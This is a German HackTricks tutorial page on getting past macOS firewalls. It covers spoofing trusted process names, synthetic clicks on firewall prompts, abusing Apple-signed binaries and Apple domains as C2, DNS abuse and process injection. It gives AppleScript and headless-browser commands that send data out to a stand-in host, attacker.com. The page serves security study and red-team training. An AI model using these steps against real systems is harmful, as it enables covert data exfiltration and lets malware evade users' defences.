# macOS Firewalls umgehen

{% hint style="success" %}
Lernen Sie und üben Sie AWS-Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie und üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
{% endhint %}

## Gefundene Techniken

Die folgenden Techniken wurden in einigen macOS-Firewall-Apps gefunden.

### Missbrauch von Whitelist-Namen

* Zum Beispiel das Benennen von Malware mit Namen von bekannten macOS-Prozessen wie **`launchd`**

### Synthetischer Klick

* Wenn die Firewall den Benutzer um Erlaubnis bittet, lässt die Malware **auf Erlauben klicken**

### Verwendung von von Apple signierten Binärdateien

* Wie **`curl`**, aber auch andere wie **`whois`**

### Bekannte Apple-Domains

Die Firewall könnte Verbindungen zu bekannten Apple-Domains wie **`apple.com`** oder **`icloud.com`** zulassen. Und iCloud könnte als C2 verwendet werden.

### Generischer Bypass

Einige Ideen, um Firewalls zu umgehen

### Überprüfen des erlaubten Datenverkehrs

Das Wissen über den erlaubten Datenverkehr hilft Ihnen dabei, potenziell in die Whitelist aufgenommene Domains oder die Anwendungen zu identifizieren, die darauf zugreifen dürfen.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Ausnutzen von DNS

DNS-Auflösungen werden über die signierte Anwendung **`mdnsreponder`** durchgeführt, die wahrscheinlich Zugriff auf DNS-Server haben wird.

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Über Browser-Apps

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Über Prozessinjektionen

Wenn Sie **Code in einen Prozess injizieren** können, der berechtigt ist, eine Verbindung zu einem beliebigen Server herzustellen, könnten Sie die Firewall-Schutzmaßnahmen umgehen:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Referenzen

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{% hint style="success" %}
Lernen Sie & üben Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
{% endhint %}
